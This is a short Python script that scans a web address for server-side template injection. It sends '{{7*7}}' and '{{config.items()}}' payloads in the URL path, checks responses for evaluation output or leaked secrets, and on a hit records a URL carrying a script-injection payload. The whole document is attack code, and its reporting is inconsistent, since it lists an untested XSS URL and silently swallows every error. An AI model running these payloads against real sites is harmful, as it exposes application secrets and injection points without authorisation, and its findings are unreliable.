import requests
def scan(base):
    found = []
    for vector in ["/{{7*7}}", "/{{config.items()}}"]:
        try:
            r = requests.get(base + vector, timeout=5)
            if "49" in r.text or "SECRET" in r.text:
                found.append(base + "/{{'<script>alert(1)</script>'|safe}}")
        except: pass
    return found